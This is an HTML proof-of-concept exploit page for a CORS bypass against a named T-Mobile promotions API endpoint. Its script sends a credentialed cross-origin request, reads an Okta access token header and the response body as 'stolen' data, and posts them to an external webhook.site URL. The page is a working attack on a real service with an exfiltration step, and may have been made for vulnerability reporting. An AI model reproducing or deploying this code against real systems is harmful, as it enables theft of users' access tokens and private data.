<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CRITICAL: CORS Bypass Proof of Concept</title>
    <style>
        body { font-family: sans-serif; background: #0b0e11; color: #e1e1e1; padding: 40px; }
        .vuln-card { border: 2px solid #e20074; padding: 20px; border-radius: 8px; background: #1c2128; }
        .magenta { color: #e20074; font-weight: bold; }
        pre { background: #0d1117; padding: 15px; border-radius: 5px; color: #39d353; overflow-x: auto; }
        .status { font-weight: bold; padding: 5px; border-radius: 4px; }
        .success { background: #238636; color: white; }
    </style>
</head>
<body>

<div class="vuln-card">
    <h1>T-Mobile CORS Regex Bypass</h1>
    <p>Target: <span class="magenta">adn.t-mobile.com</span></p>
    <p>Attack Origin: <span class="magenta" id="origin"></span></p>
    
    <button onclick="startExploit()" style="padding: 10px 20px; cursor: pointer;">Execute Exploit</button>

    <h3>Status: <span id="status">Awaiting Trigger...</span></h3>
    
    <div id="result-area" style="display:none;">
        <h4>Stolen Sensitive Headers:</h4>
        <pre id="headers-output"></pre>
        
        <h4>Stolen Response Body:</h4>
        <pre id="body-output"></pre>
    </div>
</div>

<script>
    document.getElementById('origin').innerText = window.location.origin + window.location.pathname;

    async function startExploit() {
        // Using the Promotions API endpoint you just verified
        const targetUrl = "https://adn.t-mobile.com/prmtns-meg-promo-api/prd01/promo-api/v1/promo-admin/client/1044/asset/MaintenanceText";
        const status = document.getElementById('status');
        
        status.innerText = "Sending Credentialed Request...";

        try {
            const response = await fetch(targetUrl, {
                method: 'GET',
                mode: 'cors',
                credentials: 'include', // THIS STEALS THE COOKIES
                headers: {
                    // These headers trigger the preflight you just bypassed
                    'HeliosSourceApp': 'promo-ui',
                    'ServiceTransactionID': 'poc-test-123'
                }
            });

            // If the bypass works, we can read these exposed headers
            const oktaToken = response.headers.get('Okta_Access_Token') || "Not Found (User not logged in)";
            const serviceId = response.headers.get('servicetransactionid');
            const data = await response.text();

            status.innerText = "EXPLOIT SUCCESSFUL";
            status.className = "status success";
            
            document.getElementById('result-area').style.display = "block";
            document.getElementById('headers-output').innerText = 
                `Okta_Access_Token: ${oktaToken}\n` +
                `Service-Transaction-Id: ${serviceId}\n` +
                `Access-Control-Allow-Origin: ${response.headers.get('Access-Control-Allow-Origin')}`;
            
            document.getElementById('body-output').innerText = data;

            // Optional: Send stolen data to your webhook
            fetch("https://webhook.site/7dedcf0e-fa4f-4dba-a805-04d37de87b08", {
                method: "POST",
                mode: "no-cors",
                body: JSON.stringify({vuln: "CORS_BYPASS", data: data, token: oktaToken})
            });

        } catch (err) {
            status.innerText = "Failed: Check Console (F12) for CORS Errors";
            console.error(err);
        }
    }
</script>

</body>
</html>
